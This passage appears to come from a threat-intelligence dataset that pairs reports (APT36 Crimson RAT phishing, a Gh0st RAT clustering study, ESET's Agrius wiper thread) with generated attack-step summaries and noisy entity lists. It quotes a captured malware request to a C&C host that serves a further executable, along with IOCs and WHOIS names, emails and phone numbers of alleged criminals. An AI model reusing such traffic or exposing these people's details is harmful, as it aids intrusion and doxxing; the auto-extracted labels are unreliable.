malicious Office document to victims via spearphishing email. 2. The document exploits the DDE protocol in Office to execute commands remotely on the victim's system when the victim enables macros. 3. Gallmaker runs various publicly available tools like WindowsRoamingToolsTask, Metasploit payloads, WinZip, and Rex Powershell library on the compromised system. 4. These tools are used to schedule tasks, set up reverse shells, archive data, and manipulate Powershell scripts. 5. Gallmaker communicates with command and control infrastructure to control the compromised hosts. 6. After completing their objectives, Gallmaker deletes tools from the systems to hide traces of their activity. ",valid_84,"['Gallmaker', 'Office', 'victims', 'the DDE protocol', 'commands', 'the victim', 'System', 'macros', 'WindowsRoamingToolsTask', 'Metasploit', 'WinZip', 'Rex Powershell library', 'Compromise', 'use', 'tasks', 'archive data', 'Powershell scripts', 'traces', 'activity']",Gallmaker; Office; victims; the DDE protocol; commands; the victim; System; macros; WindowsRoamingToolsTask; Metasploit; WinZip; Rex Powershell library; Compromise; use; tasks; archive data; Powershell scripts; traces; activity.
"7/10/2020Operation ‘Honey Trap’: APT36 Targets Defense Organizations in IndiaOperation ‘Honey Trap’: APT36 Targets Defense Organizations in Indiaseqrite.com/blog/operation-honey-trap-apt36-targets-defense-organizations-in-indiaBy Kalpesh MantriJuly 8, 2020Estimated reading time: 4 minutesSummaryIn the last 3 months, we have noticed increased activity from APT36, a Pakistan-linked Cyber Threat actor. The target this time are personnel belonging to defence organizations & other Government organizations in India.In the recent wave of attacks, APT36 is using honey trapping technique to lure their targets. The “honey trap” operations use fake profiles of attractive women to entice targets into opening their emails or chatting over messaging platforms, ultimately leading them into downloading malware.Some of the attachment names that we found in the current themed attack:url ‘Honey Trap’: APT36 Targets Defense Organizations in IndiaWhen target opens such attachment, it drops MSIL based Crimson RAT which has been used by APT36 in many of their past attacks. This RAT is used for data-stealing activities and sending them to a CnC server.Operation ‘Honey Trap’Indian Army has described ‘honey trap’ cases as a weapon of hybrid warfare being waged by the enemy across the borders. The same theme is now being used by APT36 to lure its targets.Image: News feeds showing the use of ‘honey trap’ casesCampaign Overviewurl ‘Honey Trap’: APT36 Targets Defense Organizations in IndiaThis campaign continues to use two separate infection chains. These two infection techniques of APT36 have remained the same in the past couple of years.In the first chain, a spear-phishing email has a macro loaded document as an attachment. This document is responsible to execute a dropper module that starts the Crimson RAT tool to perform malicious activity.Image: Infection Chain – Scenario 1In the second chain, a spear-phishing email attachment directly contains a dropper module within a zip file. This dropper component opens a decoy document for the victim and runs Crimson RAT tool in the background to perform malicious activity.Image: Infection Chain – Scenario 2The second infection chain is not so successful in organizations as their firewalls usually block ‘EXE’ filetype within an email. This is the main reason, it is targeting personal accounts of individuals related to the Indian Defence sector.url ‘Honey Trap’: APT36 Targets Defense Organizations in IndiaCrimson RATCrimson RAT remains a popular arsenal on APT36 group. We had published details of another APT36 attack last month; working of the malware remains the same.url organizationsSummarized behaviour of this RAT-Process:File:List processes Kill process Execute commandsData Exfiltration:Download from C2 Upload to C2Drives, files and directory traversal Search for file extensions Metadata extractionSingle and Continuous screenshots Get Thumbnails, Screen SizeCapture Screen:Shown here are some functionality implementations in crimson RAT code:Image: Functionality to list all running processurl ‘Honey Trap’: APT36 Targets Defense Organizations in IndiaImage: Functionality to check and add startup entry in the registryImage: Functionality to search files of a given extensionImage: Functionality to capture screenshot.ConclusionIt is a well-established fact, that APT36 targets defence and other critical sector organizations. Usually, their targets are individuals and organizations which are of strategic interest to India’s western neighbour. However, in this campaign, interestingly,url ‘Honey Trap’: APT36 Targets Defense Organizations in Indiasome of the targeted entities belong to organizations based in the eastern states in India! In last one year, this is the second instance where we saw APT36 targeting organizations of interest to India’s eastern neighbourIOCs associated to the honeytrap campaign:03E499D6E15817F5C7EF0F4F2FFD6D27 CAC313C91582E670F157F988FA13317CD878DEB55697E89E1D0CDB0C0653744E5D12B6262F07E8AA25A0D8A95E43712765FEFAC3C068EA371D9282AB9C2A7274C5C8ACA9A64AF0C1AEA58025973D254FF9FD08599E65F70B3DA6C795B544FAC4F90AE4B45BA2FE74761CE3EEDB20FF50FEFE9C2D49EFFF2F32C78688AEC15C1283B1E625E72Aurl ‘Honey Trap’: APT36 Targets Defense Organizations in IndiaSubject matter experts: Pavankumar Chaudhari Kalpesh Mantriurl "," 1. The attacker sends a spear phishing email with a malicious attachment, often a document with macros or a ZIP file. 2. The attachment executes a dropper module that installs the Crimson RAT malware. 3. Crimson RAT connects to a command and control server operated by the attacker. 4. The attacker sends commands to perform reconnaissance and exfiltrate data from the infected system. 5. Crimson RAT can gather system information, take screenshots, search for files, and steal data. 6. The exfiltrated data is sent to the attacker's server. 7. Crimson RAT provides ongoing backdoor access to the compromised machine. ",valid_14,"['a spear', 'email', 'a zip file', 'The attachment', 'a dropper module', 'Crimson RAT', 'commands', 'data', 'screenshots', 'files']",a spear; email; a zip file; The attachment; a dropper module; Crimson RAT; commands; data; screenshots; files.
"The many faces of Gh0st Rat Plotting the connections between malware attacksSnorre Fagerland, Principal Security ResearcherNorman ASAContent Introduction 3The variants 4Clusters and links 6Overview plot – with Gh0st 7Overview plot – without Gh0st 8Example botnet infrastructure: wk1888.com 11Example botnet infrastructure: pk39.com 16Individual clusters 18Conclusions 68References 69© N o r m a n A S A 2 0 1 2P a g e | 2IntroductionGh0st Rat is a well-known Chinese remote access trojan which was originally made by C.Rufus Security Team several years ago. Just as with other well-featured “off-the-shelf” trojans like Poison Ivy, Hupigon and DarkComet it has been used by all sorts of people – from the script kiddie next door to resourceful targeted attack actors (1)Cybercriminals use off-the-shelf malware not only because it’s easy and cheap. They also use it because it’s hard to track. Anybody could use this malware, so the criminal could be anybody. However, this changes somewhat when they start modifying the code. The malware now becomes somewhat attributable and can be connected to known cases and criminal groups. This document is the result of examining selected common traits between some 1200+ Gh0st Rat program files (samples) with the help of Maltego, a tool to visualize data connections. The samples were processed by us in a timeframe of approximately six months, from August 2011 to February 2012.In this study we attempt to map out what logical connections do exist between different Gh0st botnet campaigns. This is important because it gives an indication of the scale of operation and sometimes what the aims of the campaigns are, and this can be valuable for risk analysis. Additional data produced by the study may be used for risk mitigation.© N o r m a n A S A 2 0 1 2P a g e | 3The variantsThe Gh0st Rat source code (version 3.6) is freely available on the Internet, something that has made it quite popular and sparked a multitude of modifications. The resulting trojan can be hard to recognize as Gh0stRat, as attackers ditch various parts of the code that they don't need and add other functionality. In addition, the trojan is packaged in different ways – standalone, glued together with other files, included in self extracting archives. It is frequently obfuscated and compressed.As a result of all this, antivirus naming is variable, to put it mildly. Most antivirus detections today are automatically generated, resulting in names thought out by machines. Quick, but containing information only machines find interesting.The most stable indicator of being faced with a Gh0stRat is its network communication. It is well documented and quite distinctive, as it always begins with a “magic word” which in its default configuration is “Gh0st” – thus Gh0st Rat. Below is a typical packet (content data blurred)Fig 1 The fields are magic identifier (‘Gh0st’), size of packet, size of uncompressed packet, and lz-compressed data containing information about the compromised computer.This magic tag is very easy to spot in network traffic, so the bad guys have come up with a countermeasure. They use other magics. I searched our in-house Malware Analyzer G2 (MAG2) pcaps for network traffic that matched the Gh0st packet format, and this showed about 50 different magics from the last few months. There are many more in existence – some are shown in Table 2, but as we had no traffic data on these, they were not investigated.7hero, Adobe, B1X6Z, BEiLa, BeiJi, ByShe, FKJP3, FLYNN, FWAPR, FWKJG, GWRAT, Gh0st, GOLDt, HEART, HTTPS, HXWAN, Heart, IM007, ITore, KOBBX, KrisR, LUCKK, LURK0, LYRAT, Level, Lover, Lyyyy, MYFYB, MoZhe, MyRat, OXXMM, PCRat, QWPOT, Spidern, Tyjhu, URATU, W0LFKO, Wangz, Winds, World, X6RAT, XDAPR, Xjjhj, ag0ft, attac, cb1st, https, whmhl, xhjykTable 1. Gh0st magic tags used in this paper© N o r m a n A S A 2 0 1 2P a g e | 400000, ABCDE, apach, Assas, Blues, chevr, CHINA, cyl22, DrAgOn EXXMM, Eyes1, Gi0st, GM110, Hello, httpx, kaGni, light, LkxCq, lvxYT, Naver, NIGHT, NoNul, Origi, QQ_124971919, Snown, SocKt, Super, Sw@rd, v2010, VGTLS, wcker, Wh0vt, wings, X6M9K, xqwf7, YANGZTable 2. Known Gh0st magics not investigated in this paper.The length of the magic is by default 5 bytes, but this is not the case for all variants. In Table 1 there are magics with non-standard length – “Spidern” and “W0LFKO” – and we have seen others that were not included in this investigation, like “DrAgOn” and “QQ_124971919”.The Spidern variant is non-standard in another way as well. It does not compress its network traffic, something most other Gh0st do. However, when looking at the code in the disassembler IDA Pro, the code relationship is clearly visible.Fig 2 Spidern vs Gh0st comparison© N o r m a n A S A 2 0 1 2P a g e | 5Clusters and links Clusters are composed of samples that share common traits. Usually this will be common magic tag, but this is not always the case. Sometimes clusters can form around other parameters, such as common command & control (C&C) infrastructure. Logical links between clusters occur when samples, infrastructure components or other factors exhibit traits that belong in more than one cluster. For example, a sample with a magic of “cb1st” obviously belongs in the cb1st cluster, but if the C&C server it connects to also accepts connections from samples using the magic “whmhl”, then there is a logical link between the cb1st and whmhl clusters. The strength of such links varies, as there always are possible sources of error which are difficult to map out fully. Such uncertainties can be to what extent is a malware variation shared or sold, or to what extent is command & control infrastructure hired out or shared.Because of these uncertainties, we will only point out where links do exist, without offering hard conclusions.© N o r m a n A S A 2 0 1 2P a g e | 6Overview plot – with Gh0stFig 3 Overview with the Gh0st clusterThis mosquito swarm consists of trojan files, interconnected primarily by their magic tag, but also by whatever other factor shared with other samples – which C&C server they dial back to, and sometimes which IP address this resolves to. The large kludge in the middle is the default Gh0st group totaling 522 nodes.A better overview is perhaps gained by removing the “Gh0st” cluster from the graph, as it is the default configuration and not usable for connecting clusters. Doing so results in a smaller set of more distinct clusters, where the connections are more visible.© N o r m a n A S A 2 0 1 2P a g e | 7Overview plot – without Gh0stFig 4 Overview without the Gh0st clusterThe clusters that link together form clusters of clusters. Stealing unashamedly from astronomy, let’s call these superclusters. How such superclusters are linked together is detailed in the chapters that cover individual clusters later in this paper.© N o r m a n A S A 2 0 1 2P a g e | 8Supercluster oneThis collection of linked clusters contain some of the most populous in the whole set. They are linked through the usage of the same C&C servers, through the same malware, and through the same observed network traffic. The links running through the PCRat cluster are dotted red as they are presumably weaker than the others.© N o r m a n A S A 2 0 1 2P a g e | 9Supercluster twoSupercluster two contains some small and medium size nodes, and indeed one cluster, IM007, that has no registered samples in this sample set. Some samples from these clusters have exhibited behavior indicating that they have been used in connection with game account theft.© N o r m a n A S A 2 0 1 2P a g e | 10Example botnet infrastructure: wk1888.comA large amount of samples connected to www.wk1888.com. This host accepted connections from at least two botnet clusters – Gh0st on port 8000, and cb1st on port 8181. We have also seen Gh0st samples attempting to connect on port 8080 without being able to establish communication.This multi-botnet support appears usually to be related to timing. Based on the header timestamp of the trojan files, the port 8181 cb1st samples were predominantly created May- June 2011, while the port 8000 Gh0st samples were created Sept-Oct 2011.Compile timeline for binaries connecting towk1888.com25.09.2011 Gh0st (5x)29.09.2011 Gh0st (10x)28.09.2011 Gh0st (9x)22.09.2011 Gh0st (5x)03.10.2011 Gh0st (9x)18.09.2011 Gh0st (5x)02.09.2011 cb1st (1x)10.11.2011 Gh0st (1x)05.06.2011 cb1st (35x)14.06.2011 cb1st (1x)31.05.2011 cb1st (23x)12.06.2011 cb1st (42x)01.06.201101.07.201101.08.201101.09.201101.10.201101.11.201101.12.201101.05.2011WK1888.COM has resolved to many IP addresses over time, all belonging to Krypt Technologies [AS 35908], a US-based VPS hosting service. At the time of writing the IP is both associated with earlier Gh0st Rat samples, and to the domains wt1888.com and 81266966.com.© N o r m a n A S A 2 0 1 2P a g e | 11The wk1888.com host ran at one point a webserver on port 2011 where it hosted download information and more executables to download. A sample which used this functionality was the transaction below:GET /1.txt?abc=78823 HTTP/1.1 Accept: */* Accept-Encoding: gzip, deflate User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET4.0C; .NET4.0E) Host: www.wk1888.com:2011 Connection: Keep-Alive HTTP/1.1 200 OK Content-Length: 69 Content-Type: text/plain Last-Modified: Tue, 15 Nov 2011 12:02:04 GMT Accept-Ranges: bytes ETag: ""d446d6638ea3cc1:276"" Server: Microsoft-IIS/6.0 X-Powered-By: ASP.NET Date: Wed, 16 Nov 2011 01:26:05 GMT hxxp://www.wk1888.com:2011/1.exe cluster, connecting back to wk1888.com on port 8181. The xf80.exe file is a DarkShell DDOS (2), and on 81266966.com. The latter hosted downloader and DDOS trojans that connected back to wk1888.com (3)© N o r m a n A S A 2 0 1 2P a g e | 12Attribution wk1888.comThe WHOIS information for wk1888.com is as follows: meng, meng 1377887494@qq.com east china jiaotong university nanchang, jiangxi 330013 China The same registration information is used for the domains 81266966.COM, WT1888.COM, FZ0575.COM and AF0575.COM.Googling the email address “1377887494@qq.com” shows that it is also used to register the domain “boyul.com”, but with different address/phone information.BOYUL.COM Administrative Contact: wenyan zhong 1377887494@qq.com telephone: +86.051052478530 fax : +86.051052478531 jiangsu wuxi hehuali wuxi jiangsu 214000 CN Krypt Technologies and has historically even been resolved to by wk1888.com.The data (phone/address) used to register boyul.com match literally thousands of other domain registrations: HON168.COM, 1585GB.COM, ZJHD518.COM, 17173CGW.COM etc.The QQ address 1377887494 is used in several advertisements on the hacking forum my3800.com (Central China Honker Security):GH0ST “Selling undetected GH0ST kits. A package of 50 zombie machines (chicken) comes included, for 200 yuan (ca 35 USD) a month. Rent zombie machines pr day or pr month, contact me”.© N o r m a n A S A 2 0 1 2P a g e | 13The QQ number is also found on the forum beishan.info (4), where the poster complains about problems with the registration of the domain www.sock8.com, which he claims he has bought from a registered seller on taobao.com. Taobao is the Chinese version of eBay.This post was made May 27th 2011. The WHOIS info for the sock8.com domain shows that May 19th it was apparently reclaimed by Netfirms and returned to a parking IP. Before this, the domain was registered by one “bingxian feng”: jiangmen, NA 529700 China Phone: +1.102251166 Fax : Email: a916196832@yahoo.com Last modified: 2011-04-11 11:47:43 GMT In the period from the domain was registered by Bingxian Feng April 11th to its apparent seizure in May a number of Ghost trojans surfaced which connected to the sock8 domain. These had an apparent compile date April 12th and 13th.Googling for Feng’s email address in the WHOIS shows that it is used for registering literally hundreds of domains. Not only that, but it turns out that this player is well known domestically in China (5), where this person allegedly has been involved in pornography, mobile phone scams, game theft, and phishing attacks against among others People’s bank of China.© N o r m a n A S A 2 0 1 2P a g e | 14There are several cyberpolice departments (also known as “Net Cop”) in China, organized by regions.© N o r m a n A S A 2 0 1 2P a g e | 15Example botnet infrastructure: pk39.com This domain is the second of the two main hubs controlling the cb1st cluster. As previously mentioned ddos.pk39.com also operates C&C for the whmhl cluster, and the host down.pk39.com has acted as download server for other malware, typically DDOS trojans of various kinds.The Gh0st trojans dialing home to www.pk39.com were with few exceptions created Jan 13th 2011.Compile timeline for binaries connecting topk39.com20.02.2011 cb1st (1x)21.08.2011 cb1st (1x)01.02.201101.03.201101.04.201101.05.201101.06.201101.07.201101.08.201101.09.201113.01.2011 cb1st (16x)01.01.2011Attribution pk39.comIts WHOIS information is as follows:PK39.COM Administrative Contact: Name : zheng xuming Organization : zheng xuming Address : leqing huayuan lukou City : xianggangtebiexingzhengqu Province/State : xianggangtebiexingzhengqu Country : xianggangtebiexingzhengqu Email : 924539333@qq.comThe email 924539333@qq.com shows up a number of places through Google. One interesting reference is found on the site www.kissqc.com, which just says:© N o r m a n A S A 2 0 1 2P a g e | 16This is not the only defacement attributable to CǒCǒ – his name is found several places in similar fashion. He also appears to use another handle frequently associated with hacking.These handles appear to match the online profile of a male in his mid-twenties, living in Changzhou in the Jiangsu province of China. He appears to be involved in many other projects, from Android development to network security tools. The word “Ghost” is ironically used in a lot of his projects.© N o r m a n A S A 2 0 1 2P a g e | 17Individual clusters What follows is a listing and description of the individual botnet clusters. This is fairly lengthy, so feel free to skip to Conclusion towards the end of the document.Some explanation to the individual cluster graphs to come:Brown nodes are samples Blue nodes are malware families (i.e. usually Gh0st variants) Yellow nodes are C&C servers (hardcoded IP or DNS name) Purple nodes are resolved IP addresses© N o r m a n A S A 2 0 1 2P a g e | 18Cluster: 7heroThe 7hero cluster has two samples in the set. It is linked with the PCRat cluster through the 7hero C&C server at z429861812.3322.org. This could have been a coincidence - however, they both also connected at port 4928, something that only these two samples in the whole test set did.z429861812.3322.org is also used as C&C for samples in the Gh0st cluster.© N o r m a n A S A 2 0 1 2P a g e | 19Cluster: AdobeThe Adobe cluster contains one sample, and appears not linked with other clusters.© N o r m a n A S A 2 0 1 2P a g e | 20Cluster: ag0ftThe ag0ft cluster contains one sample, and appears not linked with other clusters.© N o r m a n A S A 2 0 1 2P a g e | 21Cluster: attacThe attac cluster contains one sample, and is linked with the Xjjhj cluster through shared C&C at junfang21.3322.org. This C&C server has also served as C&C for Netbot Attacker DDOS bots.© N o r m a n A S A 2 0 1 2P a g e | 22Cluster: B1X6ZThe B1X6Z cluster contains one sample, and appears not linked with other clusters.© N o r m a n A S A 2 0 1 2P a g e | 23Cluster: BeiJiThe BeiJi cluster contains five samples. Two of these samples connect to hong546049008.3322.org, a server which is shared with the IM007 cluster.© N o r m a n A S A 2 0 1 2P a g e | 24Cluster: BEiLaThis cluster contains 5 samples and is linked with the IM007 cluster through observed traffic from the C&C server aa6688519.3322.org.© N o r m a n A S A 2 0 1 2P a g e | 25Cluster: BySheThe ByShe cluster is interesting, as it has been documented used in targeted attacks against Tibetan groups (6) and also connected with the Nitro attacks (7). Five samples exist in this cluster, though no other clusters links with it.© N o r m a n A S A 2 0 1 2P a g e | 26Cluster: cb1stThe cb1st cluster is one of the larger, with 154 samples. The major C&C’s here are www.wk1888.com and www.pk39.com. The wk1888.com host also acts as C&C for many samples in the Gh0st cluster. cb1st is linked with the KrisR, XDAPR and FKJP3 clusters through the C&C at daduji.3322.org. The www.pk39.com host links cb1st with the whmhl cluster through observed traffic (see whmhl).© N o r m a n A S A 2 0 1 2P a g e | 27Cluster: FKJP3There is only one sample in this cluster. Through its C&C at daduji.3322.org it links to KrisR, XDAPR and cb1st clusters.© N o r m a n A S A 2 0 1 2P a g e | 28Cluster: FLYNNThe FLYNN cluster consists of 6 samples. It is linked with the KrisR cluster because of default configuration, not much relational information can be inferred from it, even if it shares links with many of the other clusters.© N o r m a n A S A 2 0 1 2P a g e | 32Cluster: GOLDtThe GOLDt cluster contains one sample, and appears not linked with other clusters.© N o r m a n A S A 2 0 1 2P a g e | 33Cluster: GWRATThe GWRAT cluster contains one sample, and is linked to the MoZhe cluster through returned traffic from its C&C server oa9188.3322.org.© N o r m a n A S A 2 0 1 2P a g e | 34Cluster: HEARTThere are 7 samples in the HEART cluster. HEART links with KOBBX through common C&C at through the C&C at wangyanlei.3322.org. Some of these samples (the ones connecting to in1987.3322.org and saaip.3322.org) use uncompressed communication, which is unusual for Gh0st Rat.© N o r m a n A S A 2 0 1 2P a g e | 36Cluster: HTTPSThere are two samples in this cluster, but we see no further links with other clusters.© N o r m a n A S A 2 0 1 2P a g e | 37Cluster: httpsThe https cluster contains one sample, and appears not linked with other clusters.© N o r m a n A S A 2 0 1 2P a g e | 38Cluster: HXWANThe HXWAN cluster consists of 14 samples. It is linked with the KrisR, Lyyyy and XDAPR clusters (See KrisR).© N o r m a n A S A 2 0 1 2P a g e | 39Cluster: IM007The IM007 cluster surprisingly contains no samples. The reason it exists at all is that we have logged several C&C servers replying with this magic tag, so it is a reasonable assumption that there must exist samples that follow this protocol. The servers we have seen with this behavior have been used by the BeiJi, BEiLa and Wangz clusters, thus linking these. In at least two cases we have seen samples from these clusters showing images of Dungeon Fighter Online virtual items when run, apparently as a lure for game account theft.Bamboo Bracelet, an expensive ingame item in DFO.© N o r m a n A S A 2 0 1 2P a g e | 40Cluster: IToreThe ITore cluster appears unconnected to other clusters. The executables are significantly different from other Gh0st Rats and may be another family altogether, even if the communication is similar.© N o r m a n A S A 2 0 1 2P a g e | 41Cluster: KOBBXThe KOBBX cluster consists of 13 samples in the set. It is linked with the HEART cluster through the common C&C at gyxa.3322.org, and to the LUCKK cluster through miscommunication from wjdl.3322.org.© N o r m a n A S A 2 0 1 2P a g e | 42Cluster: KrisRThe KrisR cluster consists of 205 samples. The magic tag is actually “KrisRat”, but the tag is truncated in traffic to the regular first 5 bytes.By far most samples connect back to haidishijie.3322.org, but many other C&C’s are in use. This cluster links with: FLYNN: see FLYNN Gh0st: f. ex. haidishijie.3322.org returned ‘Gh0st’ in all cases when receiving ‘KrisR’ on port 8888 HXWAN: common C&C at ssky.8866.org Lyyyy: common C&C at ssky.8866.org XDAPR: common C&C at ssky.8866.org cb1st: common C&C at daduji.3322.org FKJP3: common C&C at daduji.3322.org© N o r m a n A S A 2 0 1 2P a g e | 43Cluster: LevelThe Level cluster consists of two samples. It appears unlinked with other clusters.© N o r m a n A S A 2 0 1 2P a g e | 44Cluster: LoverThe Lover cluster consists of two samples. It appears unlinked with other clusters.© N o r m a n A S A 2 0 1 2P a g e | 45Cluster: LUCKKThe LUCKK cluster consists of four samples in the set. It is linked with the KOBBX cluster though communication (see KOBBX).© N o r m a n A S A 2 0 1 2P a g e | 46Cluster: LURK0The LURK0 cluster consists of four samples in the set. This cluster was documented as connected with the SK Communications breach in South Korea in 2011 (8), and has been seen used against Tibetan groups (9), (10).It is also linked with the OXXMM cluster through the usage of a common C&C at the clusters (See KrisR).© N o r m a n A S A 2 0 1 2P a g e | 49Cluster: MoZheThis cluster consists of 87 samples. Most of these connect back to b2bweb.3322.org. MoZhe is linked with X6RAT: common C&C at ingalar.3322.org Winds: common C&C at hkl8973875.3322.org Additional links are seen through observed traffic. GWRAT: The GWRAT C&C oa9188.3322.org replies with MoZhe (See GWRAT) KrisR: The MoZhe C&C at ingalar.3322.org replies with KrisR:© N o r m a n A S A 2 0 1 2P a g e | 50Cluster: MYFYBThe MYFYB cluster contains three samples. It does not appear connected with other clusters.© N o r m a n A S A 2 0 1 2P a g e | 51Cluster: MyRatThe MyRat cluster contains two samples. It appears unconnected with other clusters.© N o r m a n A S A 2 0 1 2P a g e | 52Cluster: OXXMMThe OXXMM cluster contains eight samples. It connects with the Gh0st main cluster through common C&C at a6422563.vicp.net and to the LURK0 cluster through common C&C at cluster (see 7hero) as well as the main Gh0st cluster through the common C&C at tajs.3322.org. It is also linked to the Winds cluster through common C&C at mstsc5.3322.org.PCRat samples have been documented used against Uyghur groups (11).It is debatable how valid the PCRat connections are. There is apparently a commercially available modification of Gh0st rat called PCRat, which we have not yet seen copies of. If that kit uses the PCRat magic tag as there is reason to suspect, this cluster is of little value.© N o r m a n A S A 2 0 1 2P a g e | 54Cluster: QWPOTThe QWPOT cluster contains only one sample. It is connected to the Xjjhj and Gh0st clusters through its C&C at s17178.3322.org.© N o r m a n A S A 2 0 1 2P a g e | 55Cluster: SpidernThe Spidern cluster consists of five samples. It appears unconnected to other clusters.© N o r m a n A S A 2 0 1 2P a g e | 56Cluster: TyjhuThe Tyjhu cluster contains seven samples. It is connected to the Winds cluster through common C&C at troyok.3322.org.© N o r m a n A S A 2 0 1 2P a g e | 57Cluster: URATUThe URATU cluster contains three samples. It appears unconnected with other clusters. However, recently it has been connected with attacks on Nepalese Government websites (12).© N o r m a n A S A 2 0 1 2P a g e | 58Cluster: W0LFKOThe W0LFKO cluster consists of one sample. It is linked to the Wangz cluster by the C&C a1019500182.3322.org which replies “W0LFKO” when connection is attempted.© N o r m a n A S A 2 0 1 2P a g e | 59Cluster: WangzThere are eight samples in the Wangz cluster. Wangz links with W0LFKO (see W0LFKO), IM007 (see IM007) clusters, and also with Xjjhi cluster through observed communication from the Wangz C&C a6603892.gicp.net.© N o r m a n A S A 2 0 1 2P a g e | 60Cluster: whmhlThe whmhl cluster consists of 9 samples; actually only 8 are Gh0stRats. The last sample is a DarkShell ddos bot. It is included because it links this cluster with another.The DarkShell bot connected to ddos.pk39.com on port 5566. This resolved to the same IP as www.pk39.com, the C&C server for the cb1st cluster. The pcap from this connection reveals that ddos.pk39.com replies with “whmhl”. Gotcha.© N o r m a n A S A 2 0 1 2P a g e | 61Cluster: WindsThe Winds cluster encompasses 21 samples. It is linked with the Tyjhu cluster (see Tyjhu), the PCRat cluster (see PCRat) and the MoZhe cluster (see MoZhe).© N o r m a n A S A 2 0 1 2P a g e | 62Cluster: WorldThe World cluster consists of seven samples.Samples in this cluster all give the impression that they use hardcoded IP addresses for their C&C communication. This is because the real C&C ip is not stored in the executable, but exists base64 encoded in a text file downloaded from a remote site. Thus these files are shown with two C&C connections.This cluster does not seem linked with other clusters. However, there is a strong resemblance between these samples and some samples in the Wangz cluster (e.g. Gh0st.© N o r m a n A S A 2 0 1 2P a g e | 64Cluster: XDAPRThe XDAPR cluster contains 28 samples. It is linked with the KrisR, HXWAN, cb1st, FKJP3 and Lyyyy clusters. (See KrisR).© N o r m a n A S A 2 0 1 2P a g e | 65Cluster: xhjykThe xhjyk cluster consists of one sample. Its C&C server, wo379733061.3322.org, is used by wk1888.com, the C&C for Gh0st and the c1bst clusters. It’s also worth noting that one of the C&C’s for the KrisR cluster is wo379733063.3322.org – only one digit different from this C&C, and corroborates the impression that the KrisR and cb1st clusters are connected.© N o r m a n A S A 2 0 1 2P a g e | 66Cluster: XjjhjThe Xjjhj cluster contains 19 samples. It is linked with the Wangz, attac and QWPOT clusters.© N o r m a n A S A 2 0 1 2P a g e | 67Conclusions This study shows the presence of several logical links between different Ghost campaigns: Links between malware type (in this case illustrated by the network protocol magic tag), links in the C&C infrastructure and to some extent links in the registration information.Due to the necessary scope limitation, many other links had to remain unexamined. However, the present work shows that some of the most active and prolific malware campaigns share enough connections indicate that the same groups or individuals are involved.In the cases where we have been able to say something about the entities responsible for the attacks, it seems apparent that the persons involved can be considered career criminals. These are people that have their hand in many different types of online crime, have been doing it for quite some time, and often target victims inside China itself.Smaller clusters are in many ways more interesting. They are often more difficult to track, as they obviously leave less clues as to who is behind the attack and what the purpose is. Clusters that have been involved in targeted attacks typically belong to these.© N o r m a n A S A 2 0 1 2P a g e | 68References 1. Wikipedia. GhostNet. Wikipedia. [Online] url Clean-MX. wt1888.com. Clean-MX domain search. [Online] url Clean-MX. 81266966.com. Clean-MX domain search. [Online] url beishan.info. [Online] url cyberpolice.cn. Nanchang Cyberpolice. [Online] url Blasco, Jaime. Targeted attacks against Tibet organizations. AlienVault Labs. [Online] url Villeneuve, Nart. The Significance of the “Nitro” Attacks. Trend Micro. [Online] url Command Five Pty Ltd. Command and Control in the Fifth Domain. [Online] url University of Toronto. Recent Observations in Tibet-Related Information Operations: Advanced Social Engineering for the Distribution of LURK Malware. Citizen Lab. [Online] url Walton, Greg. Tibetan journalists targeted by Gh0stRAT in Protest pictures.rar. MalwareLab. [Online] url protest-pictures-rar.11. Blasco, Jaime. New MaControl variant targeting Uyghur users, the Windows version using Gh0st RAT. AlienVault Labs. [Online] url windows-version-using-gh0st-rat/.12. Giuliani, Gianluca og Sharf, Elad. Nepalese government websites compromised to serve Zegost RAT . Websense Security Labs Blog. [Online] url websites-compromised-to-serve-zegost-backdoor.aspx.© N o r m a n A S A 2 0 1 2P a g e | 69© N o r m a n A S A 2 0 1 2P a g e | 70 ","1. Threat actors obtain or modify the Gh0st Rat malware source code. 2. The malware is compiled with different configuration settings like network communication magics words. 3. The customized Trojan is distributed through targeted phishing emails or drive-by downloads. 4. The victim opens the attachment or link, executing the malware. 5. The Gh0st Rat implants itself on the victim system and connects back to the command and control server. 6. The threat actor issues commands to the infected machine through the C2 channel to carry out cyber espionage, data exfiltration, or other objectives. 7. Antivirus evasion techniques like encryption and obfuscation are used to avoid detection. 8. New variants with different magics words and C2 servers are continuously deployed in campaigns targeting different groups. 9. Analysis of the network traffic reveals interconnectivity between variants and campaigns using shared infrastructure. ",valid_30,"['Gh0st rat', 'the malware', 'communication', 'magics', 'Trojan', 'Email', 'link', 'X', 'itself', 'Control', 'use', 'detection', 'variants', 'campaigns', 'Analysis', 'network traffic']",Gh0st rat; the malware; communication; magics; Trojan; Email; link; X; itself; Control; use; detection; variants; campaigns; Analysis; network traffic.
"ESET Research  ESETresearch ESETresearch identified a new wiper from  Agrius, a suspected Iranian deployed the Apostle #ransomware and #wiper. 1/5threat actor that previouslywelivesecurity.com Fantasy – a new Agrius wiper deployed through a supply‐ch… ESET researchers analyzed a supply-chain attack abusing an Israeli software developer to deploy Fantasy, Agrius’s new …11:38 AM · Dec 7, 202255Retweets2Quote  weets104Likes ESETresearch Dec 7·ESET Research Replying to  ESETresearch Agrius deployed the new wiper, Fantasy, via a supply-chain attack on an Israeli industry. 2/5software developer focused on the diamond117ESET Rh  ESETh D 7· ESETresearch Dec 7ESET Research Pre-#wiper deployment, Agrius breached several victims’ networks to steal credentials using MiniDump, which leverages  Mimikatz, and SecretsDump. Agrius then used those credentials with a custom tool, Sandals. 3/514 ESETresearch Dec 7ESET Research Sandals uses SMB shares to connect to remote systems and execute PsExec, which launches a batch file that is very similar to the batch file used by Apostle. 4/5·1110 ESETresearch Dec 7ESET Research The batch file then executes the Fantasy #wiper, which either overwrites every file, or overwrites all files with extensions on a list of 682 file extensions.·17Simon Kenin Replying to  ESETresearch@k3yp0d Dec 7·tech.walla.co.il וו - תילארשי הנכות תרבחל הצרפ תינאריא םירקאה תצובק :ףולדל לחה עדימ … Black Shadow, ,טיבריש חוטיבה תרבחל הצירפה ירוחאמ םידמועש םיפקותה ףנעל יטנרטניאה רחסמה םוחתב תוריש תקפסמה הרבחל רודחל וחילצה …1Z0E Z0E3344 Dec 8·Replying to  ESETresearch Could you share which software was abusing·@nyx__o Dec 8Tom Replying to  ESETresearch github.com/eset/malware-i…github.com GitHub - eset/malware-ioc: Indicators of Compromises (IOC) of our va… Indicators of Compromises (IOC) of our various investigations - GitHub - eset/malware-ioc: Indicators of Compromises (IOC) of our various … ","1. Agrius compromised an Israeli software developer focused on the diamond industry. 2. Agrius breached several victim networks to steal credentials using the MiniDump tool leveraging Mimikatz and SecretsDump. 